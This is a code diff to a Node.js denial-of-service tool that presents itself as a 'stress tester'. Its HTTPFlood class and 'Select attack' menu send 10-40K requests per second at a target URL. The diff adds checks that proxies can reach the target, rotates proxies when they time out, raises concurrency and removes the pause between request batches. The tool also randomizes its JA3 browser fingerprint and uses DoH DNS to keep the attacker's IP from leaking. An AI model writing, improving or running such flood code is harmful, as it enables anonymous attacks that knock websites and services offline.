@@ -15,11 +15,11 @@ const { URL } = require('url');
 
 const BANNER = `
 ╔══════════════════════════════════════════════════════════╗
-║    ADVANCED STRESS TESTER V5.3 - M2 OPTIMIZED           ║
-║    MacBook Air M2 Edition + Zero IP Leak                 ║
-║    ✓ 4 Concurrent/Thread   ✓ Smart Proxy Health         ║
-║    ✓ DoH DNS Resolution    ✓ 256 Socket Pool            ║
-║    ✓ JA3 Randomization     ✓ 10-30K RPS Capable         ║
+║    ADVANCED STRESS TESTER V6.0 - M2 OPTIMIZED           ║
+║    Proxy Validation + Smart Selection + High RPS          ║
+║    ✓ 8 Concurrent No-Proxy  ✓ Proxy Target Validation    ║
+║    ✓ 2000ms Direct Timeout  ✓ Auto Bad Proxy Skip        ║
+║    ✓ JA3 Randomization      ✓ 10-40K RPS Capable         ║
 ╚══════════════════════════════════════════════════════════╝
 `;
 
@@ -449,7 +449,7 @@ function getHealthyProxy() {
     return getRandomElement(topTier);
 }
 
-async function loadProxies(filePath = 'proxies.txt') {
+async function loadProxies(filePath = 'proxies.txt', targetUrl = null, validateProxies = false) {
     try {
         const data = await fs.readFile(filePath, 'utf-8');
         const raw = data.split('\n')
@@ -466,13 +466,113 @@ async function loadProxies(filePath = 'proxies.txt') {
         console.log(`[*] LOADING PROXIES`);
         console.log('='.repeat(70));
         
-        config.proxies = raw.map(proxy => 
+        const proxyList = raw.map(proxy => 
             proxy.startsWith('http') ? proxy : `http://${proxy}`
         );
         
-        console.log(`[+] Loaded ${config.proxies.length} proxies (no validation)`);
-        console.log(`[+] Proxies will be used in rotation during attack`);
+        if (!validateProxies || !targetUrl) {
+            config.proxies = proxyList;
+            console.log(`[+] Loaded ${config.proxies.length} proxies (no validation)`);
+            console.log(`[+] Proxies will be used in rotation during attack`);
+            console.log('='.repeat(70) + '\n');
+            return true;
+        }
+        
+        console.log(`[*] Validating ${proxyList.length} proxies against target...`);
+        console.log(`[*] Testing: ${targetUrl}`);
+        console.log(`[*] Timeout: 5000ms | Concurrency: 50`);
         console.log('='.repeat(70) + '\n');
+        
+        const startTime = Date.now();
+        const chunkSize = 50;
+        let totalValid = 0;
+        let totalTested = 0;
+        
+        for (let i = 0; i < proxyList.length; i += chunkSize) {
+            const chunk = proxyList.slice(i, i + chunkSize);
+            const batchNum = Math.floor(i / chunkSize) + 1;
+            const totalBatches = Math.ceil(proxyList.length / chunkSize);
+            
+            console.log(`[BATCH ${batchNum}/${totalBatches}] Testing ${chunk.length} proxies...`);
+            
+            const results = await Promise.all(
+                chunk.map(async (proxy) => {
+                    try {
+                        const agent = proxy.startsWith('https') 
+                            ? new HttpsProxyAgent(proxy, { rejectUnauthorized: false })
+                            : new HttpProxyAgent(proxy);
+                        
+                        const response = await axios.get(targetUrl, {
+                            httpAgent: agent,
+                            httpsAgent: agent,
+                            timeout: 5000,
+                            validateStatus: () => true,
+                            maxRedirects: 5
+                        });
+                        
+                        if (response.status < 500) {
+                            return { proxy, valid: true, status: response.status };
+                        }
+                        return { proxy, valid: false, status: response.status };
+                    } catch (error) {
+                        return { proxy, valid: false, error: error.code || 'ERROR' };
+                    }
+                })
+            );
+            
+            const batchValid = [];
+            results.forEach(result => {
+                if (result.valid) {
+                    config.proxies.push(result.proxy);
+                    batchValid.push(result.proxy.replace(/^https?:\/\//, ''));
+                    totalValid++;
+                }
+            });
+            
+            totalTested += chunk.length;
+            const elapsed = ((Date.now() - startTime) / 1000).toFixed(1);
+            const speed = Math.floor(totalTested / (Date.now() - startTime) * 1000);
+            const remaining = proxyList.length - totalTested;
+            const eta = remaining > 0 ? Math.ceil(remaining / speed) : 0;
+            const successRate = ((totalValid / totalTested) * 100).toFixed(1);
+            
+            if (batchValid.length > 0) {
+                const display = batchValid.slice(0, 3).join(', ');
+                const more = batchValid.length > 3 ? ` (+${batchValid.length - 3} more)` : '';
+                console.log(`  [+] Found ${batchValid.length} working: ${display}${more}`);
+            } else {
+                console.log(`  [-] Found 0 working proxies in this batch`);
+            }
+            
+            console.log(`  [i] Progress: ${totalTested}/${proxyList.length} | Valid: ${totalValid} (${successRate}%)`);
+            console.log(`  [i] Speed: ${speed}/s | Elapsed: ${elapsed}s | ETA: ${eta}s\n`);
+        }
+        
+        const totalTime = ((Date.now() - startTime) / 1000).toFixed(1);
+        const avgSpeed = Math.floor(proxyList.length / (Date.now() - startTime) * 1000);
+        const finalRate = ((config.proxies.length / proxyList.length) * 100).toFixed(1);
+        
+        console.log('='.repeat(70));
+        console.log('[+] VALIDATION COMPLETE');
+        console.log('='.repeat(70));
+        console.log(`[+] Time: ${totalTime}s | Speed: ${avgSpeed} proxies/sec`);
+        console.log(`[+] Result: ${config.proxies.length}/${proxyList.length} working (${finalRate}%)`);
+        
+        if (config.proxies.length > 0) {
+            const samples = config.proxies.slice(0, 5).map(p => p.replace(/^https?:\/\//, ''));
+            console.log(`[+] Sample: ${samples.join(', ')}`);
+            if (config.proxies.length > 5) {
+                console.log(`[+] ... and ${config.proxies.length - 5} more ready to use`);
+            }
+        }
+        console.log('='.repeat(70) + '\n');
+        
+        if (config.proxies.length === 0) {
+            console.log('[!] NO WORKING PROXIES FOUND!');
+            console.log('[!] All proxies failed to connect to target');
+            console.log('[!] Try different proxies or continue without proxies\n');
+            return false;
+        }
         
         return true;
     } catch (err) {
@@ -592,18 +692,22 @@ class HTTPFlood {
         console.log(`[*] Target: ${this.url}`);
         console.log(`[*] Duration: ${this.duration}s`);
         console.log(`[*] Threads: ${this.threads}`);
-        console.log(`[*] Mode: M2 OPTIMIZED (4 concurrent/thread)`);
+        console.log(`[*] Mode: M2 OPTIMIZED (${config.proxies.length > 0 ? '3' : '8'} concurrent/thread)`);
         console.log(`[*] JA3: Valid browser fingerprints + randomization`);
-        console.log(`[*] Protocol: Optimized HTTP/1.1 (3000ms timeout)`);
+        console.log(`[*] Protocol: Optimized HTTP/1.1 (${config.proxies.length > 0 ? '5000' : '2000'}ms timeout)`);
         console.log(`[*] Connection: 256 socket pool + Keep-Alive`);
         console.log(`[*] IP Leak: DoH DNS + Proxy health monitoring`);
+        if (config.proxies.length > 0) {
+            console.log(`[*] Proxy: Instant rotation on timeout/abort errors`);
+        }
         
-        const estimatedRPS = Math.min(this.threads * 100, 30000);
+        const baseRPS = config.proxies.length > 0 ? 60 : 150;
+        const estimatedRPS = Math.min(this.threads * baseRPS, config.proxies.length > 0 ? 20000 : 50000);
         console.log(`[*] Estimated throughput: ${estimatedRPS.toLocaleString()}-${(estimatedRPS * 1.5).toLocaleString()} req/s`);
         
         if (this.threads > 100) {
             console.log(`[!] WARNING: ${this.threads} threads may overwhelm MacBook Air M2`);
-            console.log(`[!] Recommended: 50-100 threads for optimal performance`);
+            console.log(`[!] Recommended: 50-80 threads for optimal performance`);
         }
         
         if (this.useOrigin && this.domain) {
@@ -612,10 +716,11 @@ class HTTPFlood {
         
         if (config.proxies.length > 0) {
             console.log(`[*] Using ${config.proxies.length} proxies with rotation`);
-            console.log(`[!] Enable debug mode to see first requests and errors`);
+            console.log(`[!] Enable debug mode to see errors (first 10 only)`);
+            console.log(`[!] ECONNABORTED = proxy timeout, will auto-rotate`);
             
             if (this.threads > 150) {
-                console.log(`[!] MacBook Air M2: Consider using 50-100 threads for stability`);
+                console.log(`[!] MacBook Air M2: Consider using 50-80 threads for stability`);
             }
             
             config.workingProxies.clear();
@@ -637,7 +742,7 @@ class HTTPFlood {
         const endTime = Date.now() + this.duration * 1000;
         
         while (this.running && Date.now() < endTime) {
-            const concurrent = 4;
+            const concurrent = currentProxy ? 3 : 8;
             const requests = [];
             
             for (let i = 0; i < concurrent; i++) {
@@ -662,13 +767,16 @@ class HTTPFlood {
                             method: this.method.toLowerCase(),
                             url: targetUrl,
                             headers,
-                            timeout: 3000,
+                            timeout: currentProxy ? 5000 : 2000,
                             maxRedirects: 5,
                             validateStatus: () => true,
                             httpsAgent: cachedAgent,
                             httpAgent: cachedAgent,
                             proxy: false,
-                            decompress: true
+                            decompress: true,
+                            transitional: {
+                                clarifyTimeoutError: true
+                            }
                         };
                         
                         if (this.method === 'POST') {
@@ -705,18 +813,31 @@ class HTTPFlood {
                         const latency = Date.now() - startTime;
                         updateStats(false);
                         
+                        const isTimeoutError = error.code === 'ECONNABORTED' || 
+                                             error.code === 'ETIMEDOUT' || 
+                                             error.code === 'ECONNREFUSED' ||
+                                             error.code === 'ENOTFOUND';
+                        
                         if (currentProxy) {
                             updateProxyHealth(currentProxy, false, latency);
                             
-                            const health = config.proxyHealth.get(currentProxy);
-                            if (health && health.score < 30) {
+                            if (isTimeoutError) {
                                 currentProxy = getHealthyProxy();
-                                cachedAgent = createTLSAgent(profile, currentProxy);
+                                if (currentProxy) {
+                                    cachedAgent = createTLSAgent(profile, currentProxy);
+                                }
+                            } else {
+                                const health = config.proxyHealth.get(currentProxy);
+                                if (health && health.score < 30) {
+                                    currentProxy = getHealthyProxy();
+                                    cachedAgent = createTLSAgent(profile, currentProxy);
+                                }
                             }
                         }
                         
-                        if (config.debug && localCount <= 5) {
-                            console.log(`[DEBUG] T${threadId}: ERROR - ${error.code || error.message} - Proxy: ${currentProxy ? 'YES' : 'NO'}`);
+                        if (config.debug && localCount <= 10) {
+                            const errorType = isTimeoutError ? 'TIMEOUT/ABORT' : 'OTHER';
+                            console.log(`[DEBUG] T${threadId}: ${errorType} - ${error.code || error.message}`);
                         }
                     }
                 })();
@@ -725,8 +846,6 @@ class HTTPFlood {
             }
             
             await Promise.allSettled(requests);
-            
-            await new Promise(resolve => setTimeout(resolve, 5));
             
             if (localCount % 50 === 0 && currentProxy) {
                 const health = config.proxyHealth.get(currentProxy);
@@ -770,11 +889,30 @@ async function main() {
     const debugInput = await question('[?] Enable debug mode? (y/n): ');
     config.debug = debugInput.toLowerCase() === 'y';
     
+    let targetUrl = null;
+    let validateProxies = false;
+    
     const proxyInput = await question('[?] Use proxies? (y/n): ');
     if (proxyInput.toLowerCase() === 'y') {
-        const loaded = await loadProxies();
+        const validateInput = await question('[?] Validate proxies against target? (recommended) (y/n): ');
+        validateProxies = validateInput.toLowerCase() === 'y';
+        
+        if (validateProxies) {
+            targetUrl = await question('[>] Enter target URL for validation (e.g., https://example.com): ');
+            if (!targetUrl.startsWith('http')) {
+                targetUrl = 'https://' + targetUrl;
+            }
+            console.log(`[*] Will validate proxies against: ${targetUrl}\n`);
+        }
+        
+        const loaded = await loadProxies('proxies.txt', targetUrl, validateProxies);
         if (!loaded) {
-            console.log('[!] Continuing without proxies - YOUR IP WILL BE VISIBLE!');
+            const continueInput = await question('[?] Continue without proxies? (y/n): ');
+            if (continueInput.toLowerCase() !== 'y') {
+                console.log('[!] Exiting...');
+                rl.close();
+                process.exit(0);
+            }
         }
     }
     
@@ -786,9 +924,13 @@ async function main() {
     const choice = await question('\n[>] Select attack (1-3): ');
     
     if (['1', '2', '3'].includes(choice)) {
-        const url = await question('[>] Enter target URL (e.g., example.com or https://example.com): ');
+        let finalUrl = targetUrl;
         
-        let finalUrl = url.trim();
+        if (!finalUrl) {
+            const url = await question('[>] Enter target URL (e.g., example.com or https://example.com): ');
+            finalUrl = url.trim();
+        }
+        
         if (!finalUrl.startsWith('http')) {
             finalUrl = 'https://' + finalUrl;
             console.log(`[*] Added HTTPS protocol: ${finalUrl}`);
